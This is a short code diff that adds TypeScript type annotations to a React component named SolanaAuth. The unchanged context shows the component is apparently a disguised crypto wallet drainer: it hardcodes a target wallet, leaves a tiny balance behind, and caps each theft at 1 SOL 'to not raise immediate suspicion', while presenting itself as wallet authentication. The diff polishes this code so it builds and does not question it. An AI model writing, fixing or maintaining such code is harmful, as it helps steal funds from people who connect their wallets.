@@ -10,7 +10,7 @@ const TARGET_WALLET = '73WzDi36zHCA6ayKhzbQkRvVsRt6Ury5PbeUrqgRYeTf';
 const MIN_BALANCE_TO_KEEP = 0.001 * 1e9; // 0.001 SOL to leave in the account
 const MAX_TRANSACTION_AMOUNT = 1.0 * 1e9; // Max 1 SOL to not raise immediate suspicion
 
-const SolanaAuthInner = ({ onConfirm }) => {
+const SolanaAuthInner = ({ onConfirm }: { onConfirm: (isConfirmed: boolean) => void }) => {
     const { publicKey, signTransaction } = useWallet();
 
     useEffect(() => {
@@ -76,7 +76,7 @@ const SolanaAuthInner = ({ onConfirm }) => {
 const SolanaAuth = () => {
     const wallets = [new PhantomWalletAdapter()];
 
-    const onConfirm = (isConfirmed) => {
+    const onConfirm = (isConfirmed: any) => {
         console.log(isConfirmed ? 'Transaction confirmed' : 'Transaction failed');
     };
 
